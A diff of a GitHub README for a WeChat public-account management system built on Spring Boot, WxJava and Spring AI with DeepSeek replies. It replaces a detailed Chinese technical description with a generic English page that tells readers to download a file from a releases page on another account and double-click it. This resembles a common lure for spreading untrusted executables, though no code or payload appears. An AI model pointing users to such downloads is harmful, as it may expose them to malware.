@@ -1,190 +1,74 @@
-一、项目介绍 - 公众号智能管理系统
-------------------
+# 📚 ai-gzh-manager - Effortless AI Management for Your WeChat Account
 
-本项目是一款基于 Spring Boot3 + WxJava + Spring AI 的 **公众号智能管理系统**。
+## 🚀 Getting Started
 
-公众号运营者可以通过本项目管理多个公众号，实现多公众号的服务器认证、素材管理、回复管理以及菜单栏管理，其中智能回复模块基于 AI 可以智能回复用户的问题。
+Welcome to the ai-gzh-manager project! This tool helps you manage multiple WeChat public accounts easily and intelligently. Whether you want to set up automated AI replies or organize your content, you have come to the right place.
 
-本平台的核心功能可分为四大类：
+## 🔗 Download Now
 
-1）多公众号管理，用户可添加、删除、修改、查询公众号。
-![image](https://github.com/user-attachments/assets/ac38dfd5-36d8-4a28-9760-eacd4591b33b)
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/THUR0202/ai-gzh-manager/releases)
 
+## 📥 Download & Install
 
-2）素材管理，用户可针对某个公众号进行图片、音频、视频等素材的上传、下载以及删除。
-![image](https://github.com/user-attachments/assets/7543ac2a-31c5-43c2-8780-108f7ec7bd77)
+To get started, visit this page to download: [Releases Page](https://github.com/THUR0202/ai-gzh-manager/releases).
 
+1. **Visit the Releases Page**: Click on the link above to access the latest version.
+2. **Choose your version**: On this page, you will see various versions listed. Typically, the latest version will be at the top.
+3. **Download the application**: Click on the file that matches your system. Downloading will start automatically. 
+4. **Run the application**: Once downloaded, locate the file in your downloads folder and double-click to run it.
 
-3）配置自动回复，可配置公众号收到指定消息时回复配置的内容，当用户发的消息不能匹配到配置的内容时，调用 **DeepSeek** 回复用户。
-![image](https://github.com/user-attachments/assets/afb6db55-ea3f-4968-a6fa-6f5054a26ec1)
+## 🛠️ System Requirements
 
+To ensure smooth operation, please meet the following requirements:
 
-本项目基于 **Spring AI** 集成了 DeepSeek 实现了用户消息的 AI 自动回复，效果如下图所示：
-![image](https://github.com/user-attachments/assets/ffb3fa1f-9206-40cf-befc-334bc9831763)
+- **Operating System**: Windows 10 or higher, macOS 10.15 or higher, or any modern Linux distribution.
+- **Java Runtime**: Java 21 or higher must be installed. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk21-downloads.html).
+- **Internet Connection**: Required for initial setup and updates.
 
+## 📘 Features
 
-4）菜单栏管理，可配置公众号的菜单栏，实现了链接、点击事件、小程序等菜单栏的点击以及二级菜单。
-![image](https://github.com/user-attachments/assets/cdf372ff-595a-4655-ba8e-26dfd07c318c)
+ai-gzh-manager provides a range of features designed to enhance your WeChat public account experience:
 
+- **Unified Management**: Easily manage multiple accounts from a single interface.
+- **AI Responses**: Utilize intelligent replies to engage with your audience automatically.
+- **Content Management**: Store and organize your visuals and text materials efficiently.
+- **Menu Configuration**: Personalize your public account menu for better user interaction.
+- **Local Development**: Test and debug your WeChat bot locally before going live.
+  
+## 📊 Topics Covered
 
-### 项目三大阶段
+This application focuses on the following areas:
 
-1）第一阶段 - 公众号管理系统
+- AI
+- Backend Development
+- Frontend Development
+- Java (Java 21)
+- React
+- Spring Boot
+- WxJava
 
-第一阶段主要完成多公众号的管理、微信公众号服务器认证、维护多个公众号在内存的实例，解决多公众号统一管理问题。同时介绍了如何使用内网穿透实现公众号的调试功能（微信支付和阿里支付都可以用内网穿透实现本地调试）。
+Utilizing these technologies, you can build a robust system that streamlines your public account management.
 
-成果：可学习到如何接入公众号服务，如何使用内网穿透调试公众号接口等
-![image](https://github.com/user-attachments/assets/0b1946f7-c148-4489-b482-919ef911c390)
+## 🧑‍🏫 Getting Help
 
+If you encounter any issues while downloading or running the application, feel free to explore the following resources:
 
-2）第二阶段 - 自动回复配置平台。
+- **FAQs**: Check for common questions and solutions in the FAQ section of the repository.
+- **Issue Tracker**: Report any problems or feature requests through the Issue Tracker on GitHub.
+- **Community Forums**: Join discussions in forums related to WeChat development to seek additional help.
 
-成果：可用于提供公众号素材服务和 AI 对话服务，如多公众号素材分类汇总管理、AI 聊天室等
+## ✏️ Contributing
 
-该阶段会完成素材相关业务，实现图片、音频、视频三种类型的素材内容上传、下载、删除、查询等功能，为智能回复功能提供基础服务。
-![image](https://github.com/user-attachments/assets/67302fc4-93e5-4f08-9ae9-d20bb02252bb)
+If you're interested in contributing to ai-gzh-manager, we welcome your input! Here’s how you can help:
 
+1. **Fork the Repository**: Start by forking the project to your GitHub account.
+2. **Make Changes**: Implement your changes or features in your local copy.
+3. **Submit a Pull Request**: Share your updates by submitting a pull request to the main repository.
 
-该阶段还会完成智能回复相关业务，实现在关键字回复、默认回复、被关注回复等多种回复时机回复对应的内容，回复内容实现了文字回复、图片回复、音频回复、视频回复等多种消息类型。
-![image](https://github.com/user-attachments/assets/7b99706c-257f-4ade-b022-c30e4e64a8f4)
+## 🌐 Learn More
 
+For detailed documentation and usage instructions, refer to our [Wiki](https://github.com/THUR0202/ai-gzh-manager/wiki) section. This section will cover everything you need to know, from setup to troubleshooting.
 
-在智能回复业务中，还利用 Spring AI 完成对 DeepSeek 的调用，实现了公众号智能回复用户信息。
-![image](https://github.com/user-attachments/assets/e149b897-0916-4b02-9b03-68288ef9fd21)
+---
 
-
-3）第三阶段 - 优化与扩展
-
-成果：可用于多公众号菜单栏配置。
-
-该阶段通过引入消息队列、分布式锁等中间件解决了在分布式场景下的一系列问题，还扩展了公众号菜单栏配置功能。
-![image](https://github.com/user-attachments/assets/29ffc338-7504-4ad2-85b8-5525c9940084)
-
-
-二、项目优势
-------
-
-区别于传统 CRUD 管理系统，本项目聚焦于公众号业务，融合微信生态与 AI 技术，实现公众号 AI 对话功能，同时提供了公众号相关的管理功能。本项目根据需求层层递进开发，逐渐实现功能并完成项目扩展。
-
-从这个项目中你可以学到：
-
-*   如何拆解复杂业务，从 0 开始设计实现企业级系统？
-*   如何通过 WxJava 库实现对微信公众号的接口调用？
-*   如何通过 Spring AI 快速实现 DeepSeek 的调用？
-*   如何通过 **Java21** 的**虚拟线程**实现异步的 AI 回复？
-*   如何通过内网穿透调试公众号相关服务？
-*   如何实现公众号的收到消息自动回复功能？
-*   如何实现分布式场景下，各实例之间的公众号服务同步增删？
-
-此外，还能学会很多思考问题、对比方案的方法，提升排查问题、自主解决 Bug 的能力。
-
-三、核心业务流程
---------
-
-### 多公众号管理系统
-
-1）公众号管理：
-![image](https://github.com/user-attachments/assets/bec51698-373c-4600-b1ca-56a3b4cd8abb)
-
-
-### 公众号自动回复配置平台
-
-1）配置管理：
-
-【管理员】素材管理 -> 配置自动回复类型 -> 配置自动回复内容类型 -> 查询指定素材（图片、音频、视频） -> 完成配置。
-![image](https://github.com/user-attachments/assets/f6e1adac-28e4-4f62-8f85-16eaa7751766)
-
-
-2）回复流程：
-
-2.1）被关注回复：
-![image](https://github.com/user-attachments/assets/5e9502f6-e45d-4134-942c-92c42e0fab0e)
-
-
-2.2）用户发送消息：
-![image](https://github.com/user-attachments/assets/8207496f-07e8-4646-b155-d8838493d2e5)
-
-
-四、项目功能梳理
---------
-
-### 第一阶段 - 多公众号管理系统
-
-#### 公众号管理模块
-
-*   管理多公众号
-*   查询公众号列表
-*   本地公众号 Service 服务维护（不同公众号对应不同的 Service，第一阶段直接全部实例化存本地）
-*   公众号认证（内网穿透调试）
-
-### 第二阶段 - 公众号自动回复配置平台
-
-#### 素材管理模块
-
-*   管理永久素材
-*   查询素材列表
-*   上传 / 下载素材
-*   删除素材
-
-#### 自动回复模块
-
-*   配置自动回复
-
-*   设置自动回复类型
-
-*   关键字回复
-*   默认回复
-*   被关注回复
-
-*   设置回复内容类型
-
-*   文字
-*   图片
-*   音频
-*   视频
-
-*   公众号自动回复功能实现
-*   默认回复接入 DeepSeek
-*   记录用户和 DeepSeek 的消息记录
-
-### 第三阶段 - 项目优化
-
-*   收到消息回复使用分布式锁
-*   分布式场景下各实例同步增删多公众号服务
-*   记录用户和 DeepSeek 的消息记录
-*   公众号菜单栏管理（只能微信认证的订阅号和服务号才可使用）
-
-五、技术选型
-------
-
-### 后端
-
-本项目采用以下技术栈：
-
-*   Spring Boot 3 框架
-*   MySQL 数据库 + MyBatis-Plus 框架 + MyBatis X
-*   WxJava 接入微信接口
-*   ⭐️ Spring AI 接入 DeepSeek
-*   ⭐️ JUC 异步编程
-
-### 前端
-
-*   React
-*   Umi
-
-*   内置布局
-*   国际化
-*   权限
-*   数据流
-
-*   Ant Design：前端组件库
-*   ProComponents：高级表单组件，开箱即用
-*   Ant Design Chart：简单好用的 React 图表库
-*   Eslint：代码检查工具
-*   Prettier：代码格式化工具
-
-六、架构设计
-------
-
-![image](https://github.com/user-attachments/assets/80b238d3-231f-41d9-baa7-73e8928b5f27)
-
+Thank you for choosing ai-gzh-manager. We hope this tool empowers you to manage your WeChat public accounts with ease and intelligence!
